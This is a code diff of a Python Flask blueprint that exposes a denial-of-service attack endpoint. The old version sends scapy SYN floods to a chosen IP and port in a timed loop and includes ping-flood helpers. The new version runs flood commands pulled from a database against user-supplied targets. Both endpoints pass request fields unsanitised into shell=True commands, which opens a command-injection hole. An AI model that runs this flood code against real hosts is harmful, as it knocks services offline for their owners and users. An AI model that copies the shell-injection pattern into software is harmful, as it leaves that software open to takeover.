@@ -1,56 +1,70 @@
-from flask import Blueprint, request
-import nmap
+from flask import Blueprint, request, jsonify
+import signal
 import subprocess
-from scapy.layers.inet import IP, TCP, ICMP
-from scapy.packet import Raw
-from scapy.sendrecv import send
-from scapy.volatile import RandShort
 import time
+import os
+from pymongo import MongoClient
+from app import db
+import threading
 
 dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")
 
 @dosAttack.post("/")
-def slowlorisDosAttack():
+def SYNFloodAttack():
     data = request.get_json()
     ipAddress = data["ipAddress"]
-    portNumber = int(data["portNumber"])
-    # type = data["type"]
+    portNumber = data["portNumber"]
+    packetSize = data["packetSize"]
+    attackType = data["attackType"]
     duration = int(data["duration"])
 
-    # ip = ipAddress
-    # port = int(portNumber)
-    # send_syn(ip, port, number_of_packets_to_send=10000)
-    # send_ping(ip, number_of_packets_to_send=10000)
+    command = getCommand("DOS", "PINGFLOOD")
+    command = command.format(
+        attackType=attackType,
+        packetSize=packetSize,
+        portNumber=portNumber,
+        ipAddress=ipAddress)
+    
+    # launch dos attack on seperate thread
+    attack = threading.Thread(target=dos, args=(command, duration))
+    attack.start()
+    attack.join()
+
+    return ""
+
+@dosAttack.post("/latency")
+def checkLatency():
+    data = request.get_json()
+    ipAddress = data["ipAddress"]
+
+    command = getCommand("PING", "LATENCY")
+    command = command.format(ipAddress=ipAddress)
+
+    pingCommand = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
+    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish
+
+    lines = output.splitlines()
+    line = lines[1]
+
+    if "time" in line:
+        return '[PING SUCCESS] ' + line
+    else:
+        return '[PING FAILED] ' + line
 
 
-    ip = IP(dst=ipAddress)
-    tcp = TCP(sport=RandShort(), dport=portNumber, flags="S")
-    raw = Raw(b"X"*1024)
-    # stack up the layers
-    p = ip / tcp / raw
-    # Get the current time
-    start_time = time.time()
+def getCommand(operation, type):
+    collection = db["commands"]
+    x = collection.find_one({
+        "operation" : operation,
+        "type": type,
+        })
 
-    # Send the constructed packet in a loop for 60 seconds
-    while time.time() - start_time < duration:
-        send(p, verbose=0)
+    return x["command"]
 
-    return "hi"
+def dos(command, duration):
+    dosCommand = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, text=True, preexec_fn=os.setsid)
+    
+    # carry out attack for specified duration
+    time.sleep(duration) 
+    os.killpg(os.getpgid(dosCommand.pid), signal.SIGTERM)
 
-
-# def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
-#     ip = IP(dst=target_ip_address)
-#     tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-#     raw = Raw(b"X" * size_of_packet)
-#     p = ip / tcp / raw
-#     send(p, count=number_of_packets_to_send, verbose=0)
-#     print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))
-
-
-# def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
-#     ip = IP(dst=target_ip_address)
-#     icmp = ICMP()
-#     raw = Raw(b"X" * size_of_packet)
-#     p = ip / icmp / raw
-#     send(p, count=number_of_packets_to_send, verbose=0)
-#     print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
